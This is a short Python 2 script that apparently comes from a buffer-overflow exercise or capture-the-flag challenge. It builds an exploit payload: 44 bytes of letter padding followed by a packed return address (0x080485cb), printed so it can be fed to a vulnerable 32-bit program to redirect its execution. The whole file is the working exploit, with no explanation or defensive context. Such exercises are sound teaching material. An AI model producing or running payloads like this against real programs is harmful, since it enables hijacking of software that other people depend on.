#!/usr/bin/python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

address = struct.pack("I", 0x080485cb)

print padding + address